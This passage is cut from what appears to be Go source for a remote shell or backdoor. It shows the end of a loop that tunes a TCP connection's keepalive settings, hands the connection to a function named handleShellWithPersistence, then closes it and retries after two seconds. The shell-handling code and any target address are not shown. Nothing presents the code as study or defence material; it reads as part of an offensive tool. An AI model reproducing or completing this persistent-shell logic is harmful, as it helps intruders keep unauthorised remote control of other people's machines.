		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(30 * time.Second)
			tcpConn.SetLinger(0)
		}

		handleShellWithPersistence(conn)
		conn.Close()

		time.Sleep(2 * time.Second)
	}
}
